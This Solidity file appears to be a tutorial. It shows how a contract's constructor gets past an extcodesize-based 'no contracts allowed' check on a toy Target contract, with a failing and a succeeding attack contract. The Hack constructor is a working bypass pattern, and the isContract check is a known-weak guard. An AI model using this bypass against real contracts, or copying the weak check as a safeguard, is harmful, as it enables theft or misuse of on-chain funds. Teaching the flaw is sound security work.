/**
 * Bypassing the Solidity contract size check, you can take control of a smart contract. Some business owners prefer that other contracts do not connect with theirs in order to provide them with added security. Owners can prevent this interaction by implementing a check on the account code size, which prevents functions from being executed. It is determined by this code size check whether or not the address communicating with the contract contains code, and if it does, then the function is not performed. Unfortunately, a developer can use this code size check to their advantage.

* Vulnerability in the size check of the solidity code
If an address contains a Solidity smart contract, you can tell if it is one by looking at the size of the code that is stored at the address. The assembly function extcodesize is used in Solidity functions to determine the size of the code at a specific location in the code. Smart contracts are defined as addresses where the code size is greater than 0.

* To pwn a contract that contains Assembly extcodesize, simply include a function in the attacking contract’s constructor. During contract creation when the constructor is executed there is no code yet so the code size will be 0. The constructor will run the function and bypass the target contract’s extcodesize check.

 * 
 * If an address is a contract then the size of code stored at the address will be greater than 0 right?

Let's see how we can create a contract with code size returned by extcodesize equal to 0.
 */
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

contract Target {
    function isContract(address account) public view returns (bool) {
        // This method relies on extcodesize, which returns 0 for contracts in
        // construction, since the code is only stored at the end of the
        // constructor execution.
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    bool public pwned = false;

    function protected() external {
        require(!isContract(msg.sender), "no contract allowed");
        pwned = true;
    }
}

contract FailedAttack {
    // Attempting to call Target.protected will fail,
    // Target block calls from contract
    function pwn(address _target) external {
        // This will fail
        Target(_target).protected();
    }
}

contract Hack {
    bool public isContract;
    address public addr;

    // When contract is being created, code size (extcodesize) is 0.
    // This will bypass the isContract() check
    constructor(address _target) {
        isContract = Target(_target).isContract(address(this));
        addr = address(this);
        // This will work
        Target(_target).protected();
    }
}
